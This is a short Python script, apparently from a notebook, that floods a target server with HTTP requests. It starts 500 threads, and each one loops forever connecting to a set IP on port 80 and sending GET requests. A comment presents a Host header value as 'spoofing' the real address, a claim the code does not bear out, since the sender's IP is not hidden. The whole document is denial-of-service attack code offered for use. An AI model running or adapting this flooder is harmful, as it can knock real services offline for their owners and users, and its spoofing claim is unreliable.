```python
import socket
import threading
```

```python
target = '10.0.0.138' #system or server
fake_ip = '182.21.20.32' #spoof the real address
port = 80 #hypter text, use http link to find one want
```

```python
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
```

```python
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
```
